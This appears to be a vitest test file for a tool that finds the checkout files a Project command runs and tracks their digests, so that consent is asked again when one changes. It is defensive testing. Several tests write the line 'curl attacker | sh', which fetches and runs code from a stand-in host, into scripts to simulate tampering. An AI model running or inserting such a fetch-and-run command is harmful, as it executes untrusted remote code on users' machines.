import { mkdir, mkdtemp, readFile, realpath, rm, stat, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';

import { readLiteralCommandExecutedFiles as readSharedLiteralCommandExecutedFiles } from '@happier-dev/cli-common/workspaces/literalCommandFiles';

import { listLiteralCommandExecutedFiles, readLiteralCommandExecutedFiles } from './literalCommandFiles';

describe('files a literal Project command runs', () => {
  const root = join('/', 'checkout');
  it.each([
    // Shell flags are not another runtime's inline-code flags.
    ['bash -e scripts/setup.sh', ['scripts/setup.sh']],
    ['sh -eu -o pipefail ./x.sh', ['x.sh']],
    ['bash -c "./inline.sh"', []],
    // Sourcing runs the named file.
    ['source scripts/env.sh && . ./env2.sh', ['scripts/env.sh', 'env2.sh']],
    // Wrapper words run the next program.
    [
      'env FOO=1 bash x.sh; sudo -u dev ./y.sh; exec ./z.sh; time nohup ./w.sh',
      ['x.sh', 'y.sh', 'z.sh', 'w.sh'],
    ],
    // Windows command and PowerShell forms.
    [
      'powershell -NoProfile -ExecutionPolicy Bypass -File scripts/setup.ps1',
      ['scripts/setup.ps1'],
    ],
    ['pwsh -Command ./inline.ps1', []],
    ['pwsh -ep bypass -file setup.ps1', ['setup.ps1']],
    ['pwsh -executionpolicy bypass -f setup.ps1', ['setup.ps1']],
    ['powershell.exe -ep Bypass -File setup.ps1', ['setup.ps1']],
    ['pwsh -configurationname Remote -file setup.ps1', ['setup.ps1']],
    ['pwsh -custompipename Pipe -file setup.ps1', ['setup.ps1']],
    ['pwsh -ex bypass -fi setup.ps1', ['setup.ps1']],
    ['powershell.exe -exec bypass -fi setup.ps1', ['setup.ps1']],
    ['pwsh -wo sub -fi setup.ps1', ['setup.ps1']],
    ['pwsh -configurationname Remote -fi setup.ps1', ['setup.ps1']],
    ['pwsh -File setup.ps1 -Command ./ignored.ps1', ['setup.ps1']],
    ['powershell.exe -Command ./inline.ps1 -File ignored.ps1', []],
    ['pwsh -e ZQB4AGkAdAA= -File setup.ps1', ['setup.ps1']],
    ['pwsh -EncodedCommand ZQB4AGkAdAA=', []],
    ['powershell.exe -ec ZQB4AGkAdAA= -f setup.ps1', ['setup.ps1']],
    ['cmd /c scripts\\a.cmd', ['scripts/a.cmd']],
    ['setup.cmd --fast', ['setup.cmd']],
    // Runtime subcommands, valued flags and versioned interpreters.
    ['deno run -A scripts/x.ts', ['scripts/x.ts']],
    ['bun run x.ts', ['bunfig.toml', 'package.json', 'node_modules/.bin/x.ts', 'x.ts']],
    ['node -r ./register.js --import tsx ./main.ts', ['register.js', 'main.ts']],
    ['node -e "require(1)" ./ignored.js', []],
    ['python3.12 -W ignore manage.py', ['manage.py', 'manage.py/__main__.py']],
    ['python -m pytest', []],
    ['php -f tools/run.php', ['tools/run.php']],
    // Outside the checkout is not a Project input.
    ['bash /opt/outside.sh', []],
    ['bash ~/x.sh', []],
    // cd moves later segments within the checkout; outside it the declared cwd stays.
    ['cd scripts && ./setup.sh; cd /opt; ./run.sh', ['scripts/setup.sh', 'scripts/run.sh']],
    // Subcommands and valued runtime flags are not the script.
    ['tsx watch src/main.ts', ['src/main.ts']],
    ['node --max-old-space-size 4096 server.js', ['server.js']],
    ['node --eval="console.log(1)" ignored.js', []],
    ['python3 -cprint(1) ignored.py', []],
    ['node - ignored.js', []],
    ['node -- -entry.js', ['-entry.js']],
  ] as const)('%s', (command, expected) => {
    expect(listLiteralCommandExecutedFiles(root, root, command)).toEqual(
      expected,
    );
  });

  it('records a directory operand and a path through a file without refusing the command', async () => {
    const checkout = await mkdtemp(join(tmpdir(), 'happier-literal-files-'));
    try {
      await mkdir(join(checkout, 'server'));
      await writeFile(join(checkout, 'server/index.js'), 'listen()');
      await writeFile(join(checkout, 'notdir'), 'file');
      const first = await readLiteralCommandExecutedFiles(checkout, checkout, 'node server; bash notdir/x.sh');
      // Node tries server.js/.json/.node first, then the folder's package.json `main`, then index.js.
      expect(first).toEqual({ kind: 'read', files: [
        { file: 'notdir/x.sh', absent: true }, { file: 'server', directory: true },
        { file: 'server.js', absent: true }, { file: 'server.json', absent: true }, { file: 'server.node', absent: true },
        { file: 'server/index.js', digest: expect.any(String) }, { file: 'server/package.json', absent: true },
      ] });
      await writeFile(join(checkout, 'server/index.js'), 'curl attacker | sh');
      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node server; bash notdir/x.sh')).not.toEqual(first);
      await mkdir(join(checkout, 'app'));
      await writeFile(join(checkout, 'app/package.json'), JSON.stringify({ main: 'lib/start.js' }));
      // No candidate exists yet, so adding any of them asks again.
      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node app')).toEqual({ kind: 'read', files: [
        { file: 'app', directory: true }, { file: 'app.js', absent: true }, { file: 'app.json', absent: true }, { file: 'app.node', absent: true },
        { file: 'app/index.js', absent: true }, { file: 'app/index.json', absent: true }, { file: 'app/index.node', absent: true },
        { file: 'app/lib/start.js', absent: true }, { file: 'app/lib/start.js.js', absent: true }, { file: 'app/lib/start.js.json', absent: true },
        { file: 'app/lib/start.js.node', absent: true }, { file: 'app/lib/start.js/index.js', absent: true },
        { file: 'app/lib/start.js/index.json', absent: true }, { file: 'app/lib/start.js/index.node', absent: true },
        { file: 'app/package.json', digest: expect.any(String) },
      ] });
    } finally { await rm(checkout, { recursive: true, force: true }); }
  });

  it('reviews the entry `node .` loads and resolves an extensionless or folder `main` the way Node does', async () => {
    const checkout = await mkdtemp(join(tmpdir(), 'happier-literal-files-'));
    try {
      await writeFile(join(checkout, 'package.json'), JSON.stringify({ main: 'dist/server' }));
      await mkdir(join(checkout, 'dist'));
      await writeFile(join(checkout, 'dist/server.js'), 'listen()');
      const first = await readLiteralCommandExecutedFiles(checkout, checkout, 'node .');
      expect(first).toEqual({ kind: 'read', files: [
        { file: '.', directory: true }, { file: 'dist/server', absent: true }, { file: 'dist/server.js', digest: expect.any(String) },
        { file: 'package.json', digest: expect.any(String) },
      ] });
      await writeFile(join(checkout, 'dist/server.js'), 'curl attacker | sh');
      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node .')).not.toEqual(first);
      await writeFile(join(checkout, 'package.json'), JSON.stringify({ main: 'lib' }));
      await mkdir(join(checkout, 'lib'));
      await writeFile(join(checkout, 'lib/index.js'), 'start()');
      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node .')).toMatchObject({ files: expect.arrayContaining([
        { file: 'lib/index.js', digest: expect.any(String) }]) });
    } finally { await rm(checkout, { recursive: true, force: true }); }
  });

  it('reviews the file Node resolves for an extensionless script operand', async () => {
    const checkout = await mkdtemp(join(tmpdir(), 'happier-literal-files-'));
    try {
      await writeFile(join(checkout, 'app.js'), 'listen()');
      const first = await readLiteralCommandExecutedFiles(checkout, checkout, 'node app');
      expect(first).toEqual({ kind: 'read', files: [{ file: 'app', absent: true }, { file: 'app.js', digest: expect.any(String) }] });
      await writeFile(join(checkout, 'app.js'), 'curl attacker | sh');
      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node app')).not.toEqual(first);
      // Nothing resolves yet: every candidate is recorded, so adding one asks again.
      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node missing')).toEqual({ kind: 'read', files: [
        { file: 'missing', absent: true }, { file: 'missing.js', absent: true }, { file: 'missing.json', absent: true },
        { file: 'missing.node', absent: true },
      ] });
    } finally { await rm(checkout, { recursive: true, force: true }); }
  });

  it('reviews app.js before the app folder, as Node resolves `node app`', async () => {
    const checkout = await mkdtemp(join(tmpdir(), 'happier-literal-files-'));
    try {
      await mkdir(join(checkout, 'app'));
      await writeFile(join(checkout, 'app/index.js'), 'folder()');
      await writeFile(join(checkout, 'app.js'), 'file()');
      const first = await readLiteralCommandExecutedFiles(checkout, checkout, 'node app');
      expect(first).toEqual({ kind: 'read', files: [{ file: 'app', directory: true }, { file: 'app.js', digest: expect.any(String) }] });
      await writeFile(join(checkout, 'app.js'), 'curl attacker | sh');
      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node app')).not.toEqual(first);
    } finally { await rm(checkout, { recursive: true, force: true }); }
  });

  it.each([
    ['tsx app', { 'app.ts': 'ts()' }, 'app.ts'],
    ['bun run app', { 'app.ts': 'ts()', 'app.js': 'js()' }, 'app.ts'],
    ['bun app', { 'app.mjs': 'mjs()', 'app/index.js': 'index()' }, 'app.mjs'],
  ] as const)('reviews every file %s may resolve, including the one it runs', async (command, tree, runs) => {
    const checkout = await mkdtemp(join(tmpdir(), 'happier-literal-files-'));
    try {
      for (const [file, content] of Object.entries(tree)) {
        await mkdir(join(checkout, file, '..'), { recursive: true });
        await writeFile(join(checkout, file), content);
      }
      const first = await readLiteralCommandExecutedFiles(checkout, checkout, command);
      expect(first).toMatchObject({ files: expect.arrayContaining(Object.keys(tree).map(file => ({ file, digest: expect.any(String) }))) });
      await writeFile(join(checkout, runs), 'curl attacker | sh');
      expect(await readLiteralCommandExecutedFiles(checkout, checkout, command)).not.toEqual(first);
    } finally { await rm(checkout, { recursive: true, force: true }); }
  });

  it.each([
    ['bun run app', 'package.json'],
    ['bun app', 'node_modules/.bin/app'],
    ['bun ./app.ts', 'bunfig.toml'],
    ['bun --cwd sub app.ts', 'sub/app.ts'],
    ['bun run --cwd=sub app.ts', 'sub/app.ts'],
    ['bun --cwd sub app', 'package.json'],
    ['bun --cwd sub tool', 'node_modules/.bin/tool'],
    ['bun --cwd sub app.ts && bash x.sh', 'x.sh'],
    ['tsx --tsconfig config.json app.js', 'app.ts'],
    ['tsx app.js', 'app.ts'],
    ['bun app.js', 'app.ts'],
    ['bun app; node app', 'app.ts'],
    ['node app; bun app', 'app.ts'],
    ['tsx app.mjs', 'app.mts'],
    ['bun app.mjs', 'app.mts'],
    ['tsx app.cjs', 'app.cts'],
    ['bun app.cjs', 'app.cts'],
    ['tsx app.jsx', 'app.ts'],
    ['bun app.jsx', 'app.ts'],
    ['deno run -c config.json app.ts', 'app.ts'],
    ['deno run --config=config.json app.ts', 'app.ts'],
    ['node --require ./preload.js app.js', 'preload.js'],
    ['bash --rcfile config.json x.sh', 'x.sh'],
    ['python3 -W ignore sub', 'sub/__main__.py'],
    ['node -r ./preload main.js', 'preload.js'],
    ['ruby -C sub app.rb', 'sub/app.rb'],
    ['pwsh -WorkingDirectory sub -File app.ps1', 'app.ps1'],
    ['pwsh -ep bypass -file setup.ps1', 'setup.ps1'],
    ['powershell.exe -executionpolicy bypass -file setup.ps1', 'setup.ps1'],
    ['pwsh -ex bypass -fi setup.ps1', 'setup.ps1'],
  ])('binds consent to the runtime-selected input: %s → %s', async (command, selected) => {
    const checkout = await mkdtemp(join(tmpdir(), 'happier-launcher-table-'));
    try {
      for (const file of ['app.ts', 'sub/app.ts', 'config.json', 'preload.js', 'x.sh']) {
        await mkdir(join(checkout, file, '..'), { recursive: true });
        await writeFile(join(checkout, file), file.endsWith('.json') ? '{}' : 'original');
      }
      const before = await readLiteralCommandExecutedFiles(checkout, checkout, command);
      expect(before).toMatchObject({ kind: 'read', files: expect.arrayContaining([expect.objectContaining({ file: selected })]) });
      await mkdir(join(checkout, selected, '..'), { recursive: true });
      await writeFile(join(checkout, selected), 'changed by collaborator');
      expect(await readLiteralCommandExecutedFiles(checkout, checkout, command)).not.toEqual(before);
    } finally { await rm(checkout, { recursive: true, force: true }); }
  });

  it.each(['bun run ./app', 'bun ./app.ts', 'node server', '~/x.sh'])('does not refuse ordinary %s', async command => {
    const checkout = await mkdtemp(join(tmpdir(), 'happier-launcher-positive-'));
    try {
      await writeFile(join(checkout, 'app.ts'), 'start()');
      await mkdir(join(checkout, 'server'));
      await writeFile(join(checkout, 'server/index.js'), 'start()');
      expect(await readLiteralCommandExecutedFiles(checkout, checkout, command)).toMatchObject({ kind: 'read' });
    } finally { await rm(checkout, { recursive: true, force: true }); }
  });

  it('reads a package `main` through a reader that returns plain Uint8Array bytes', async () => {
    const checkout = await mkdtemp(join(tmpdir(), 'happier-literal-files-'));
    try {
      await mkdir(join(checkout, 'app'));
      await writeFile(join(checkout, 'app/package.json'), JSON.stringify({ main: 'start.js' }));
      await writeFile(join(checkout, 'app/start.js'), 'start()');
      const io = {
        readBytes: async (base: string, file: string) => {
          try { return { kind: 'read' as const, bytes: new Uint8Array(await readFile(join(base, file))) }; }
          catch (error) { return (error as { code?: string }).code === 'EISDIR' ? { kind: 'refused' as const, code: 'unreadable_definition' } : { kind: 'absent' as const }; }
        },
        realpath, stat,
      };
      expect(await readSharedLiteralCommandExecutedFiles(checkout, checkout, 'node app', { io })).toMatchObject({ files: expect.arrayContaining([
        { file: 'app/start.js', digest: expect.any(String) }]) });
    } finally { await rm(checkout, { recursive: true, force: true }); }
  });
});
